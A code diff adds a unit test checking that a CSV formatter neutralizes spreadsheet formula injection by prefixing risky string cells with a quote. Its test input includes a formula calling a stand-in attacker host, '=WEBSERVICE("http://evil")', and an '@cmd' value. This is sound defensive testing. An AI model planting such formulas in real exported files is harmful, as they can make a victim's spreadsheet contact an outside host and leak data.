@@ -37,6 +37,17 @@ describe('formatters', () => {
       .toString()
     expect(out).toBe('A,B\r\nplain,"has,comma"\r\n"he said ""hi""","line1\nline2"')
   })
+
+  it('neutralizes spreadsheet formula injection in string cells', () => {
+    const out = csvFormatter
+      .render(['A', 'B'], [['=WEBSERVICE("http://evil")', '+1+2'], ['@cmd', '-5']])
+      .toString()
+    // each risky string is prefixed with a quote so a spreadsheet treats it as text
+    expect(out).toBe('A,B\r\n"\'=WEBSERVICE(""http://evil"")",\'+1+2\r\n\'@cmd,\'-5')
+    // a genuine negative NUMBER is untouched (only strings are guarded)
+    const nums = csvFormatter.render(['N'], [[-5]]).toString()
+    expect(nums).toBe('N\r\n-5')
+  })
 })
 
 describe('Exports.run', () => {
